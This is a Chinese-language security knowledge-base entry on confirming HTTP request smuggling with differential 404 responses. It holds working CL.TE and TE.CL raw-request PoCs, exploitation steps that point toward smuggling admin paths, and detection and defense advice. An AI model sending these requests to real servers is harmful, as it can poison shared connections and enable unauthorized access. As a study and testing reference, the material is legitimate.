---
id: web-generic-http-smuggling-differential-response-confirmation
title: 请求走私的差分响应确认：走私一个 GET /404 前缀，使紧随其后的正常请求返回 404
type: scenario
domain: web
path: web/generic/http-smuggling
technique: request-smuggling-differential-response-confirmation
aliases:
- 差分响应确认请求走私
- differential responses smuggling
- 404 确认法
- CL.TE 确认
- TE.CL 确认
tags:
- http-smuggling
- detection
- differential-response
- cl-te
- te-cl
- http1
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V614
  verified_at: '2026-11-12T20:50:41+08:00'
  notes: '已对照原文『检测扩展-响应差异』及图16-22核对：CL.TE 用 CL 35 + 0 块后 GET /404 HTTP/1.1/X-Ignore: X，第二请求 404（图17/18）；TE.CL 通用示例 7c + GET /404 + CL 144 + x=，靶场截图20用 5e + POST /404 变体，两者均为原文内容。未验证点：PoC 未本机复跑；无 sources；无版本/CVE。dedup：与 CL.0、pause-based、空 CL 等均不同链，保留。'
---

## 一句话结论

先走私一个把 `GET /404 HTTP/1.1` 前缀注入连接缓冲的请求，紧接着发送一个正常请求；若正常请求的响应变成 404 或出现被拼接的异常结果，即可确认请求走私存在并判断方向。

## 原理

- 时间延迟法只能说明"可能有解析差异"，差分响应法能进一步证明"后端确实把攻击者字节当成了下一个请求"。
- CL.TE 方向：前端按 CL 转发完整攻击包，后端按 chunked 在 `0` 块结束，剩余字节 `GET /404 HTTP/1.1\r\nX-Ignore: X` 留在后端连接缓冲中；随后正常请求被拼在这段前缀之后，后端先解析出 `GET /404`，于是返回 404，正常请求的响应被"吃掉"或错位。
- TE.CL 方向：前端按 chunked 在 `0` 块结束，后端按 CL 继续读取，chunk 内的 `GET /404...` 成为下一请求；同样使后续正常请求得到 404。
- 为什么有效：404 是一个可预测、易观察的响应差异，且不依赖业务逻辑；只要后续正常请求的响应从 200 变成 404，就说明它前面多出了一个后端可见的请求。
- 攻击包末尾常带一个占位头（如 `X-Ignore: X`），用于吸收被拼接的正常请求行，避免其与方法行冲突导致解析失败。

## 触发条件

- 存在 CL.TE 或 TE.CL 解析差异。
- 后端连接会被复用，或至少攻击请求与正常请求落在同一后端连接上。
- 目标存在可稳定返回 200 的正常请求与可识别 404 的路径。
- 攻击者能在短时间内连续发送两个请求（Repeater 的 send group / 原始 socket）。

## 利用步骤

1. 选定一个稳定返回 200 的正常请求（如 `POST /search` 带固定参数），记录基线响应。
2. CL.TE 确认包：`Content-Length` 覆盖整包，`Transfer-Encoding: chunked`，正文为 `0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X`；紧接发送正常请求。
3. 若正常请求返回 404，说明前缀生效；若返回 200，调整 CL 使攻击包被完整转发，或检查代理是否拒绝 CL+TE 并存。
4. TE.CL 确认包：`Content-Length: 4`（覆盖 chunk 首行），chunk 内写 `GET /404 HTTP/1.1\r\nHost: ...\r\nContent-Type: ...\r\nContent-Length: 144\r\n\r\nx=`，以 `0` 块结束；紧接正常请求。
5. 确认方向后，把 `/404` 换成目标管理路径或恶意路径进入利用。

## PoC

CL.TE 差分确认（原文靶场流程）：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

TE.CL 差分确认：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```

说明：发送攻击包后立即在同一连接发送正常请求，预期正常请求返回 404。长度字段需按实际报文计算，`7c` 为 chunk 大小十六进制。PoC 为靶场流程的结构化复现，未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：把 `/404` 换成任意不存在路径、受保护路径或带反射参数的路径，观察状态码/响应体差异。
- 变体：CL.TE 可让攻击包与正常请求共用同一 TCP 连接；TE.CL 中若前端不转发尾部，需要确认连接是否复用。
- 关联：[[web-generic-http-smuggling-time-delay-detection]]（先用时间定位方向，再用差分确认）、[[web-generic-http-smuggling-cl-te-basic-chunk-prefix]]、[[web-generic-http-smuggling-te-cl-basic-chunk-prefix]]、[[web-generic-http-smuggling-front-end-acl-bypass-smuggled-request]]（确认后走私管理请求）。
- 边界：前端每个请求新建后端连接、代理拒绝异常长度、或中间设备重写请求时，差分现象可能不出现。

## 检测与防御

- 检测（防守方）：后端日志出现前端未记录的 `GET /404` 等异常请求；同一连接短时间内出现两个请求而代理日志只有一个；正常请求响应状态码异常跳变。
- 防御：拒绝 CL+TE 并存；统一解析器；前端重新序列化请求；禁用后端连接复用；后端 ACL 不信任"已过前端"这一隐含前提。
- 加固：部署 desync 检测（比较前后端请求数/路径）；对 404 异常链路告警；WAF 检测 chunk 体后的完整请求行。
